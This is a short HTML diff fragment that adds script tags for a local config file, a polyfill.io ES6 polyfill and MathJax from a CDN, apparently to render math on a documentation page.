+        <script src="../../javascripts/config.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+    
+  </body>
+</html>
